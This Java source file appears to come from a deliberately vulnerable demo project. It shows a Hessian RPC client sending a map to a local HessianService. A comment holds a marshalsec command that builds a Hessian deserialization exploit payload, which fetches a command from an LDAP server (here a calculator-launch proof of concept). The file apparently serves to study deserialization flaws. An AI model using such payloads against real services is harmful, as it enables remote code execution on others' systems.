package org.javaweb.vuln.hessian;

import com.caucho.hessian.client.HessianProxyFactory;
import org.javaweb.vuln.service.HessianService;

import java.util.HashMap;

/**
 * @author su18
 */
public class HessianClient {

	public static void main(String[] args) throws Exception {
		//java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringPartiallyComparableAdvisorHolder ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA== >hession
		String                  url     = "http://localhost:8002/HessianService";
		HessianProxyFactory     factory = new HessianProxyFactory();
		HessianService          service = (HessianService) factory.create(HessianService.class, url);
		HashMap<String, String> map     = new HashMap<String, String>();
		map.put("a", "d");

		System.out.println("Hello: " + service.printObject(map));
	}

}
